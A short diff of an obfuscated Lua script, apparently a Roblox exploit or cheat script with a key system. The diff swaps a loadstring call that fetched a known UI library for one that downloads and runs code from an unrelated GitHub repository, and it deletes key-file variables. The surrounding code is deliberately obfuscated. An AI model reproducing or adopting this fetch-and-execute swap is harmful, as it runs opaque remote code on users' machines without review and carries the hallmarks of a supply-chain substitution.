@@ -29,10 +29,8 @@ repeat
     end
 until ea==23099
 local Sb=game:GetService('HttpService')
-local b=loadstring(game:HttpGet('https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua'))()
+local b=loadstring(game:HttpGet("https://raw.githubusercontent.com/Igoy969/igoy/refs/heads/main/igoycoba"))();
 local ma='https://paste.monster/9g4TZBCnLT8D/raw/'
-local qb='QuietX_Key.json'
-local y=nil
 local function Rb(M,Ua)
     local fb,B,_b,Ma,ab,tb,yb,ga,rb,j,Qb,Cb
     ga,yb={[-24087]=11993,[-16332]=14879,[17486]=-9016,[10627]=17351,[13452]=-21063,[15984]=-26619,[-11419]=7493,[27400]=8372,[-526]=-8644,[-26541]=14879,[16810]=-18251,[-14933]=27912,[16936]=-21063,[32290]=18763},function(ya)
